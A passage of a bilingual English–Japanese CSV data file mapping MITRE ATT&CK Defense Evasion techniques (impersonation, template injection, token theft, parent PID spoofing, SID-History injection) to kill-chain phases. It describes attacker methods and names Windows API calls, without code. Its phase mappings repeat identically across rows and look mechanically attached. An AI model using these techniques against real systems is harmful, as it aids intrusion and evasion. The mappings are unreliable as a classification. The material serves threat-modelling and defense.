BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1656,なりすまし,Impersonation,"攻撃者は、信頼できる人物や組織になりすまして、ターゲットを説得し騙して何らかの行動を代行させる可能性があります。例えば、攻撃者は、経営幹部、同僚、サードパーティベンダーなどの既知の送信者になりすまして、被害者と通信する可能性があります（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)、[フィッシング](https://attack.mitre.org/techniques/T1566)、または[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)を介して）。確立された信頼は、その後、複数の被害者に対して、攻撃者の最終的な目標を達成するために利用される可能性があります。\n \nビジネスメール詐欺やメール詐欺キャンペーンの多くの場合、攻撃者はなりすましを使用して被害者を詐取します。つまり、被害者を騙して送金させたり、最終的に[金銭的窃盗](https://attack.mitre.org/techniques/T1657)を可能にする情報を漏洩させたりします。

敵対者はまた、悪意のある活動が検出される前に被害者が迅速に行動するように仕向けるために、メールの件名や本文に「支払い」、「リクエスト」、「緊急」などの操作的で説得力のある言葉遣いなどのソーシャルエンジニアリング技術を使用することがよくあります。これらのキャンペーンは、多くの場合、職務やアクセス権限のために敵対者の目標を達成できる人々を特に標的にしています。\n \nなりすましは通常、[被害者ID情報の収集](https://attack.mitre.org/techniques/T1589)や[被害組織情報の収集](https://attack.mitre.org/techniques/T1591)などの偵察テクニックや、偽のIDを裏付けるためのメールドメイン（つまり[ドメイン](https://attack.mitre.org/techniques/T1583/001)）などのインフラストラクチャの取得に先行されます。(引用: CrowdStrike-BEC)\n \nなりすましを伴うキャンペーンでは、複数の被害者が発生する可能性があります。例えば、攻撃者はある組織を標的として[アカウントの侵害](https://attack.mitre.org/techniques/T1586)を行い、その後、他のエンティティに対するなりすましをサポートするために使用できます。(引用: VEC)","Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).

Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1221,テンプレートインジェクション,Template Injection,"攻撃者は、ユーザー文書テンプレート内の参照を作成または変更して、悪意のあるコードを隠蔽したり、認証試行を強制したりする可能性があります。例えば、MicrosoftのOffice Open XML (OOXML) 仕様は、古いバイナリ形式 (.doc, .xls, .ppt) を置き換えるために、Office文書 (.docx, xlsx, .pptx) 用のXMLベースの形式を定義しています。OOXMLファイルは、さまざまなXMLファイル（パーツと呼ばれる）で構成されるZIPアーカイブにまとめられており、文書がどのようにレンダリングされるかをまとめて定義するプロパティを含んでいます。(引用: Microsoft Open XML July 2017)

パーツ内のプロパティは、オンラインURLを介してアクセスされる共有パブリックリソースを参照する場合があります。例えば、テンプレートプロパティは、文書のロード時に取得される、事前にフォーマットされた文書の設計図として機能するファイルを参照する場合があります。

敵対者は、これらのテンプレートを悪用して、ユーザー文書を介して実行される悪意のあるコードを最初に隠蔽する可能性があります。文書に注入されたテンプレート参照により、文書がロードされるときに悪意のあるペイロードを取得して実行できるようになる場合があります。(引用: SANS Brian Wiltse Template Injection) これらの文書は、[フィッシング](https://attack.mitre.org/techniques/T1566)や[汚染された共有コンテンツ](https://attack.mitre.org/techniques/T1080)などの他のテクニックを介して配信される可能性があり、悪意のあるペイロードが取得されるまで典型的なインジケータ（VBAマクロ、スクリプトなど）が存在しないため、静的検出を回避する可能性があります。(引用: Redxorblue Remote Template Injection) 実際には、テンプレートインジェクションがエクスプロイトを含む悪意のあるコードをロードするために使用された例が見られています。(引用: MalwareBytes Template Injection OCT 2017)

敵対者はまた、.rtfファイル内の<code>*\\template</code>コントロールワードを変更して、同様に悪意のあるコードを隠蔽してからダウンロードする可能性があります。この正当なコントロールワード値は、.rtfファイルが開かれたときに取得されてロードされるテンプレートファイルリソースのファイル宛先であることを意図しています。しかし、敵対者は既存の.rtfファイルのバイトを変更して、悪意のあるペイロードのURLリソースを含むテンプレートコントロールワードフィールドを挿入する可能性があります。(引用: Proofpoint RTF Injection)(引用: Ciberseguridad Decoding malicious RTF files)

このテクニックはまた、SMB/HTTPS（または他の資格情報プロンプト）URLを注入し、認証試行をトリガーすることにより、[強制認証](https://attack.mitre.org/techniques/T1187)を可能にする場合もあります。(引用: Anomali Template Injection MAR 2018)(引用: Talos Template Injection July 2017)(引用: ryhanson phishery SEPT 2016)","Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)

Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)

Adversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)

This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1134,アクセストークン操作,Access Token Manipulation,"攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。

攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)

標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。","Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",T1134.001,トークン偽装/窃取,Token Impersonation/Theft,"攻撃者は、権限を昇格させアクセス制御をバイパスするために、別のユーザーの既存のトークンを複製して偽装する可能性があります。例えば、攻撃者は`DuplicateToken`または`DuplicateTokenEx`を使用して既存のトークンを複製できます。(引用: DuplicateToken function) その後、トークンは`ImpersonateLoggedOnUser`と共に使用して呼び出しスレッドがログオンユーザーのセキュリティコンテキストを偽装できるようにするか、`SetThreadToken`と共に使用して偽装トークンをスレッドに割り当てることができます。

攻撃者は、複製したトークンを割り当てたい特定の既存のプロセスがある場合に、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)を実行する可能性があります。例えば、これはターゲットユーザーがシステム上で非ネットワークログオンセッションを持っている場合に役立つ可能性があります。

攻撃者が既存のプロセスにアタッチするのではなく、複製したトークンを使用して新しいプロセスを作成する場合は、追加で`CreateProcessWithTokenW`または`CreateProcessAsUserW`を使用して[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)を行うことができます。[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)は、新しいトークンを作成するのではなく、既存のトークンを複製することを指すため、[トークンの作成と偽装](https://attack.mitre.org/techniques/T1134/003)とも区別されます。","Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1134,アクセストークン操作,Access Token Manipulation,"攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。

攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)

標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。","Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",T1134.004,親PIDスプーフィング,Parent PID Spoofing,"攻撃者は、プロセス監視防御を回避したり権限を昇格させたりするために、新しいプロセスの親プロセス識別子（PPID）を偽装する可能性があります。新しいプロセスは、明示的に指定されない限り、通常、その親プロセスまたは呼び出し元プロセスから直接生成されます。新しいプロセスのPPIDを明示的に割り当てる1つの方法は、使用するPPIDを定義するパラメータをサポートする<code>CreateProcess</code> API呼び出しを介することです。(引用: DidierStevens SelectMyParent Nov 2009) この機能は、要求された昇格プロセスが現在のユーザーコンテキストではなくSYSTEM（通常は<code>svchost.exe</code>または<code>consent.exe</code>を介して）によって生成された後、PPIDを正しく設定するために、ユーザーアカウント制御（UAC）などのWindows機能によって使用されます。(引用: Microsoft UAC Nov 2018)

攻撃者はこれらのメカニズムを悪用して、Officeドキュメントから直接生成されるプロセスをブロックするものなどの防御を回避したり、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)の一部として配信されたOfficeドキュメントではなく<code>explorer.exe</code>であるかのように[PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011)のPPIDを偽装するなど、異常な/潜在的に悪意のある親子プロセス関係をターゲットとする分析を回避したりする可能性があります。(引用: CounterCept PPID Spoofing Dec 2018) この偽装は、悪意のあるOfficeドキュメント内の[Visual Basic](https://attack.mitre.org/techniques/T1059/005)または[ネイティブAPI](https://attack.mitre.org/techniques/T1106)を実行できる任意のコードを介して実行される可能性があります。(引用: CTD PPID Spoofing Macro Mar 2019)(引用: CounterCept PPID Spoofing Dec 2018)

PPIDを明示的に割り当てることは、親プロセスへの適切なアクセス権があれば、昇格された権限を有効にすることもできます。例えば、特権ユーザーコンテキスト（つまり管理者）の攻撃者は、新しいプロセスを生成し、親をSYSTEMとして実行されているプロセス（<code>lsass.exe</code>など）として割り当てることで、継承されたアクセストークンを介して新しいプロセスを昇格させることができます。(引用: XPNSec PPID Nov 2017)","Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1134,アクセストークン操作,Access Token Manipulation,"攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。

攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)

標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。","Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",T1134.005,SID履歴インジェクション,SID-History Injection,"攻撃者はSID履歴インジェクションを使用して権限を昇格させ、アクセス制御をバイパスする可能性があります。Windowsセキュリティ識別子（SID）は、ユーザーまたはグループアカウントを識別する一意の値です。SIDは、セキュリティ記述子とアクセストークンの両方でWindowsセキュリティによって使用されます。(引用: Microsoft SID) アカウントは、SID履歴Active Directory属性に追加のSIDを保持でき(引用: Microsoft SID-History Attribute)、ドメイン間の相互運用可能なアカウント移行を可能にします（例：SID履歴のすべての値がアクセストークンに含まれます）。

ドメイン管理者（または同等の）権限があれば、収集されたまたはよく知られているSID値（引用: Microsoft Well Known SIDs Jun 2017）をSID履歴に挿入して、エンタープライズ管理者などの任意のユーザー/グループの偽装を有効にすることができます。この操作により、ローカルリソースへの昇格されたアクセスや、[リモートサービス](https://attack.mitre.org/techniques/T1021)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)、または[Windowsリモート管理](https://attack.mitre.org/techniques/T1021/006)などの横方向の移動テクニックを介した、それ以外ではアクセスできないドメインへのアクセスが可能になる場合があります。","Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

